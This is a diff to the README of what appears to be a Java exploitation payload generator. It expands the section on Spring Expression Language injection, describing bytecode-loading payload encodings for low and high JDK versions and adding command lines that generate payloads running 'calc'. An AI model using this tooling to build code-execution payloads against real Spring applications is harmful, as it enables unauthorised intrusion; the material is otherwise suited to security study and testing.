@@ -3052,16 +3052,20 @@ rmi://127.0.0.1:1234/Basic
 
 #####  SPEL 表达式利用
 
-- SPEL-JSCode-JavaCode
-- SPEL-JavaCode：用于JDK高版本下的利用
+- SPEL-JavaCode：SPEL-JavaCode，适用于jdk低版本运行的spel表达式环境。Payload中使用java.util.Base64进行解码字节码。
+- SPEL-JSCode-JavaCode：使用Spel执行js表达式然后再字节码加载，适用于jdk低版本运行的spel表达式环境。
+- SPEL-JavaCode-JDKHigh：
+  - 使用Spel直接进行字节码加载。
+  - 这个Payload不适用于jdk8环境的利用，适用于jdk高版本(jdk17)运行的spel表达式环境。jdk高版本下org.springframework.cglib.core.ReflectUtils#defineClass有五个利用参数。低版本有4个所以不能低版本利用。
+  - 工具会生成俩种Payload，一种gzip压缩字节码，一种base64加载字节码。
 
 ```bash
+-m ThirdPartyAttack -g CustomClass -a "auto_cmd:calc" -encode "SPEL-JavaCode"
+
 -m ThirdPartyAttack -g CustomClass -a "auto_cmd:calc" -encode "SPEL-JSCode-JavaCode"
+
+-m ThirdPartyAttack -g CustomClass -a "auto_cmd:calc" -encode "SPEL-JavaCode-JDKHigh"
 ```
-
-
-
-
 
 #####  Groovy 表达式利用
 
